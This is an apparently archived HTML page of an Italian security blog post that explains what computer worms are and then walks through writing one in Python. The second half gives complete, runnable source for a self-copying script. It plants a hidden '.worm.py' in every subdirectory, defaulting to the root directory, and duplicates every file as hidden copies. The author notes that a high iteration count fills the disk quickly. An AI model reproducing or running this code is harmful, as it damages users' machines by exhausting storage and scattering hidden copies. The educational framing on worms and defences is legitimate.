@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Scrivere un Worm in Python :: HomePage</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Table Of Contents:
+ Cos&amp;rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://kobra3390.github.io/SpaceHack/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="Autore: k0Br@3390" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Scrivere un Worm in Python">
+<meta property="og:description" content="Table Of Contents:
+ Cos&amp;rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito." />
+<meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/" />
+<meta property="og:site_name" content="HomePage" />
+
+  
+    <meta property="og:image" content="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="Tutorial" />
+
+  <meta property="article:section" content="Malware Analysis" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://kobra3390.github.io/SpaceHack/">
+  <div class="logo">
+    SpaceHack
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  
+  <div id="search" style="margin-left: 10px;margin-top: 20px;">
+    <input id="searchInput" tabindex="0">
+    <button id="searchButton">Search</button>
+    <ul id="searchResults">
+    </ul>
+  </div>
+  <script src="https://kobra3390.github.io/SpaceHack/js/fuse.js"></script> 
+  <script src="https://kobra3390.github.io/SpaceHack/js/search.js"></script>
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/">Scrivere un Worm in Python</a>
+  </h1>
+  <div class="post-meta">
+    
+    
+      <span class="post-author">Autore: k0Br@3390</span>
+    
+    
+      <span class="post-reading-time">:: 8 min read (1535 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/malware-analysis/">Malware Analysis</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/malware/">Malware</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/worm/">Worm</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/python/">Python</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Table Of Contents</strong>:</p>
+<ul>
+<li><a href="#cos---un-worm">Cos&rsquo;è un Worm</a></li>
+<li><a href="#scrivere-un-worm-in-python">Scrivere un worm in Python</a></li>
+</ul>
+<p>In questo post voglio iniziare una mini serie sulla <code>Malware Analysis</code>, al fine di comprendere qual&rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.</p>
+<h1 id="cosè-un-worm">Cos&rsquo;è un Worm<a href="#cosè-un-worm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Un worm è un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilità nelle reti. A differenza di un virus, che richiede l&rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l&rsquo;infezione iniziale dell&rsquo;host, non richiedono la partecipazione dell&rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.</p>
+<p>I worm condividono schemi simili: sfruttano le vulnerabilità del sistema, hanno un modo per propagarsi e contengono tutti codice dannoso (payload) per causare danni ai sistemi o alle reti dei computer.
+I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. Nel 2001, il worm Code Red aveva infettato oltre 300.000 server in sole 19 ore.</p>
+<p>Alcune persone pensano che un worm informatico e un virus informatico siano la stessa cosa perché i due si comportano in modo simile.  Potrebbero persino usare termini come &ldquo;worm computer virus&rdquo; o &ldquo;worm virus malware&rdquo;.  La verità è che i due sono minacce comparabili ma diverse.</p>
+<p>La differenza fondamentale tra un virus e un worm è che i virus si basano sull&rsquo;azione umana per l&rsquo;attivazione e hanno bisogno di un sistema host per replicarsi.  In altre parole, un virus non danneggerà il tuo sistema a meno che tu non lo esegua.  Ad esempio, un virus su un&rsquo;unità flash collegata al tuo computer non danneggerà il tuo sistema a meno che tu non lo attivi.  E come accennato in precedenza, un worm non ha bisogno di un sistema host o di un&rsquo;azione dell&rsquo;utente per diffondersi.</p>
+<p>Nel corso degli anni, ci sono stati alcuni vermi particolarmente devastanti. Alcuni vermi hanno causato miliardi di danni.  Ecco un breve elenco di alcuni famigerati:</p>
+<ul>
+<li><strong>Morris Worm:</strong> noto anche come Internet worm, questo è stato uno dei primi worm informatici a diffondersi tramite Internet e guadagnare notorietà nei media.</li>
+<li><strong>Bagle:</strong> noto anche come Beagle, Mitglieder e Lodeight, questo worm di mailing di massa aveva molte varianti.</li>
+<li><strong>Blaster:</strong> noto anche come MSBlast, Lovesan e Lovsan, questo worm ha attaccato i computer con Windows XP e Windows 2000.</li>
+<li><strong>Conficker:</strong> noto anche come Downup, Downadup e Kido, questo worm ha sfruttato i difetti di Windows per infettare milioni di computer in oltre cento paesi.</li>
+<li><strong>ILOVEYOU:</strong> Il worm ILOVEYOU ha infettato decine di milioni di computer in tutto il mondo, causando danni per miliardi di dollari.</li>
+<li><strong>Mydoom:</strong> questo è diventato il worm di posta elettronica a più rapida diffusione nel 2004, inviando posta indesiderata attraverso i computer.</li>
+<li><strong>Ryuk:</strong> Sebbene Ryuk non sia sempre stato un worm, ora è un ransomware simile a un worm.</li>
+<li><strong>SQL Slammer:</strong> il worm SQL Slammer ha guadagnato fama per aver rallentato il traffico Internet con attacchi denial-of-service su alcuni host Internet.</li>
+<li><strong>Storm Worm:</strong> questo worm ha utilizzato l&rsquo;ingegneria sociale con notizie false di una tempesta disastrosa per lanciare botnet su macchine compromesse.</li>
+<li><strong>Stuxnet:</strong> alcuni esperti ritengono che questo sofisticato worm sia stato sviluppato per anni per lanciare un attacco informatico.</li>
+</ul>
+<p>Molti dei sintomi di un worm informatico sono simili a quelli di un virus informatico.  Ad esempio, potresti avere un worm se il tuo computer rallenta, si blocca, si blocca o genera messaggi di errore.  Potresti anche notare che i file sono mancanti o danneggiati o che lo spazio sul tuo disco rigido si sta rapidamente esaurendo inspiegabilmente.  Inoltre, potresti ricevere avvisi dal tuo firewall su una violazione.</p>
+<p>Come altre forme di malware, i worm informatici possono essere fermati con il giusto software antivirus e antimalware e pratiche informatiche sicure.  Si prega di non intrattenere collegamenti sospetti, e-mail, testi, messaggi, siti Web, reti di file P2P e unità.  Inoltre, aggiorna regolarmente il tuo software essenziale per proteggere il tuo computer da vulnerabilità come il difetto di Windows wormable e simili.</p>
+<h1 id="scrivere-un-worm-in-python">Scrivere un worm in Python<a href="#scrivere-un-worm-in-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Il worm è un tipo di malware che replica se stesso e altri file per consumare spazio nei nostri dischi rigidi. Potresti scoprire che le tue unità o partizioni si riempiono senza alcun motivo visibile e ciò potrebbe accadere a causa di un worm.</p>
+<p>Un worm è diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).</p>
+<p>Avremo bisogno di due moduli per scrivere un worm. Qui, <em>os</em> è il modulo più importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.</p>
+<p><em>shutil</em> è usato per copiare il contenuto del file.  Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> shutil
+</code></pre></div><p>Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
+    
+    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
+            
+        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
+            
+        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
+        
+        <span style="color:#75715e"># get own absolute path</span>
+        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
+</code></pre></div><p>Qui abbiamo tre argomenti:</p>
+<ul>
+<li>path: definisce dove iniziare a cercare le directory (l&rsquo;impostazione predefinita è la directory principale /)</li>
+<li>target_dir_list: l&rsquo;utente può passare un elenco di directory di destinazione iniziali. Per impostazione predefinita è un elenco vuoto []</li>
+<li>iteration: Ho usato questo parametro per definire quante istanze creerà il worm per ogni file esistente in una directory (il valore predefinito è 2 solo a scopo di test, puoi aumentare o diminuire il numero, o meglio fornire valur durante la creazione di un oggetto della classe)</li>
+</ul>
+<p>Il primo metodo di cui abbiamo bisogno è elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.</p>
+<p>Qui, sto evitando i file nascosti poiché include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS).  A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
+        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
+        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
+        
+        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
+            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
+                <span style="color:#75715e"># get the full path</span>
+                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
+                print(absolute_path)
+
+                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
+                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
+                <span style="color:#66d9ef">else</span>:
+                    <span style="color:#66d9ef">pass</span>
+</code></pre></div><p>Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
+        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
+            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
+            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
+</code></pre></div><p>Il seguente metodo verrà utilizzato per duplicare i file il numero di volte il valore che abbiamo dall&rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
+        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
+            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
+                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
+                    source <span style="color:#f92672">=</span> abs_path
+                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
+                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
+                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
+</code></pre></div><p>In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierà tutte le azioni in sequenza.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
+        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
+        print(self<span style="color:#f92672">.</span>target_dir_list)
+        self<span style="color:#f92672">.</span>create_new_worm()
+        self<span style="color:#f92672">.</span>copy_existing_files()
+</code></pre></div><p>Ora, creiamo la nostra funzione principale ed eseguiamo il codice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
+    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
+    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
+    worm<span style="color:#f92672">.</span>start_worm_actions()
+</code></pre></div><p>Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(&quot;&quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.</p>
+<p>Ecco il codice completo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> shutil
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
+    
+    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
+            
+        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
+            
+        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
+        
+        <span style="color:#75715e"># get own absolute path</span>
+        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
+        
+        
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
+        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
+        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
+        
+        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
+            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
+                <span style="color:#75715e"># get the full path</span>
+                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
+                print(absolute_path)
+
+                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
+                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
+                <span style="color:#66d9ef">else</span>:
+                    <span style="color:#66d9ef">pass</span>
+    
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
+        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
+            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
+            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
+            
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
+        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
+            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
+                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
+                    source <span style="color:#f92672">=</span> abs_path
+                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
+                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
+                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
+                        
+                        
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
+        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
+        print(self<span style="color:#f92672">.</span>target_dir_list)
+        self<span style="color:#f92672">.</span>create_new_worm()
+        self<span style="color:#f92672">.</span>copy_existing_files()
+        
+        
+                        
+<span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
+    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
+    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
+    worm<span style="color:#f92672">.</span>start_worm_actions()
+</code></pre></div><p>Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:</p>
+
+  <img src="https://kobra3390.github.io/SpaceHack/images/WriteWormInPython.png"  class="left"  style="width: 300px"  />
+
+
+<p>Eseguiamo il worm 2 volte con il comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 worm<span style="color:#f92672">.</span>py
+</code></pre></div><p>Ecco il risultato:</p>
+
+  <img src="https://kobra3390.github.io/SpaceHack/images/WriteWormInPython2.png"  class="left"  style="width: 300px"  />
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Introduzione All&#39;ARP Poisoning</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/">
+                <span class="button__text">Walkthrough Explore</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
